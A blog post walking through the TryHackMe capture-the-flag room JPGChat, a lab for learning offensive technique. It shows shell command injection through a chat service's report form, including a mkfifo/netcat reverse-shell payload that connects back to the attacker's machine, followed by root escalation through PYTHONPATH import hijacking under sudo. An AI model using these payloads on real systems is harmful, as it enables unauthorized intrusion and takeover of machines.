---
layout: post
title: TryHackMe Walkthrough - JPGChat
date: 2021-06-26
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Easy
permalink: /2021/06/JPGChat
img: 2021/06/JPGChat/JPGChat.png
---

This is an easy room where we need to find the code of a chat application to exploit it. And then use sudo to gain root access.

* Room: JPGChat
* Difficulty: Easy
* URL: [https://tryhackme.com/room/jpgchat](https://tryhackme.com/room/jpgchat)
* Author: [R4v3n](https://tryhackme.com/p/R4v3n)

```
Exploiting poorly made custom chatting service written in a certain language...
```

## Enumeration

I first launched RustScan to look for opened ports on the target machine.

```bash
$ rustscan -a target -- -A -script vuln | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.175.99:22
Open 10.10.175.99:3000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
```

Port 22 (SSH) is opened. And port 3000. This is not a standard port so I looked at what's on it. 

## Chat Application

I tried to connect to port 3000 with Telnet. It gave me the prompt of the application, but I got disconnected every times I sent something. So I switched to Netcat. And it worked better.

```bash
$ nc target 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[MESSAGE]
There are currently 0 other users logged in
[MESSAGE]: Hello
[MESSAGE]: 
```

The application allow us to send messages or to report someone to the admins.

```bash
[MESSAGE]: [REPORT]
this report will be read by Mozzie-jpg
your name:
Eric
your report:
aaaa
[MESSAGE]:
```

The report function request a name and the report, but does not give any feedback. 

Part of the welcome message caught my attention.

```
the source code of this service can be found at our admin's github
```

I searched for 'jpchat source code' and found the [GitHub page with the code](https://github.com/Mozzie-jpg/JPChat). I had to be careful, because the first result was for a writeup of the room and I didn't want any spoilers.

The `report_form()` function is the one that is vulnerable to code injection.

```python
def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```

It takes whatever I send and insert it into a bash command to echo it and insert it in a file. It does not escape anything. So I could use it to run any command I wanted. 

I tried running a simple command to confirm I could exploit it.

```bash
[MESSAGE]: [REPORT]
this report will be read by Mozzie-jpg
your name:
'; whoami ; '
your report:
a

wes
[MESSAGE]:
```

Now that I knew how to send commands, I used it to open a reverse shell to my machine. I started a Netcat listener, then sent a report with the reverse shell code. 

```bash
[MESSAGE]: [REPORT]
this report will be read by Mozzie-jpg
your name:
'; mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg ; echo 'a
your report:
a

```

The waiting listener got the connection.

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.99 39028
whoami
wes
```

I immediately solidified my shell. 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

CTRL-z
stty raw -echo;fg
```

Next I could read the user flag.

```bash
wes@ubuntu-xenial:/$ pwd
/
wes@ubuntu-xenial:/$ cd
wes@ubuntu-xenial:~$ ls
user.txt
wes@ubuntu-xenial:~$ cat user.txt 
REDACTED
wes@ubuntu-xenial:~$ 
```

## Escalation

Now that I was in the machine, I needed a way to get root access. First thing I always try is to see if the user can run sudo. 

```bash
wes@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

They can run a python script as root. 

```bash
wes@ubuntu-xenial:~$ ls -la /opt/development/test_module.py
-rw-r--r-- 1 root root 93 Jan 15 18:58 /opt/development/test_module.py
wes@ubuntu-xenial:~$ cat /opt/development/test_module.py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /opt/development/test_module.py
True
```

I couldn't modify the script it ran. But it imports functions from compare, and I can modify the environment variables. I created a file called `compare.py` in wes home folder, then called the script passing it this folder in the PYTHONPATH environment variable. This way, when the script tried to import compare, it will read my file and execute my code.

```bash
wes@ubuntu-xenial:~$ cat compare.py 
#!/usr/bin/env python3
import pty; 
pty.spawn("/bin/bash")

wes@ubuntu-xenial:~$ chmod +x compare.py

wes@ubuntu-xenial:~$ PYTHONPATH=/home/wes sudo /usr/bin/python3 /opt/development/test_module.py

root@ubuntu-xenial:~# whoami
root

root@ubuntu-xenial:~# cat /root/root.txt 
REDACTED

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
```

This room was really easy. I was not expected to root it so fast. But it was still fun. I enjoyed attacking something that was not a web application.

